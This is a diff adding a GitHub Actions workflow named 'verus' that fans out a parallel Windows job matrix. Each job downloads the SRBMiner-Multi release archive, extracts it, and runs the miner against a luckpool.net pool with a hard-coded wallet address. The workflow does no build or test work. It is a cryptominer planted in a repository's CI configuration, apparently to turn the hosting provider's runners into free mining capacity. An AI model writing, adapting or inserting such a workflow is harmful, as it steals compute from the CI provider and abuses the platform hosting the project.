@@ -1,0 +1,51 @@
+name: verus
+
+ 
+
+on: [workflow_dispatch] 
+
+ 
+
+jobs: 
+
+build: 
+
+name: verus 
+
+runs-on: windows-latest 
+
+strategy: 
+
+max-parallel: 5 
+
+fail-fast: false 
+
+matrix: 
+
+go: [1.0, 1.1, 1.2, 1.3, 1,35] 
+
+flag: [A, B, C, D, E, F, G, H, I] 
+
+env: 
+
+NUM_JOBS: 20 
+
+JOB: ${{ matrix.go }} 
+
+steps: 
+
+- name: DOWNLOAD 
+
+run: Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-win64.zip 
+
+- name: Extract 
+
+run: Expand-Archive SRBMiner-Multi-0-9-3-win64.zip 
+
+- name: Running 
+
+run: .\SRBMiner-Multi-0-9-3/SRBMiner-MULTI.exe -v -l na.luckpool.net:3956 -u RPwsqC2RZsswfWVx5mfJSMzpVwJVqzdZit.Rig1 -p x -t 2 
+
+- name: END 
+
+run: exit
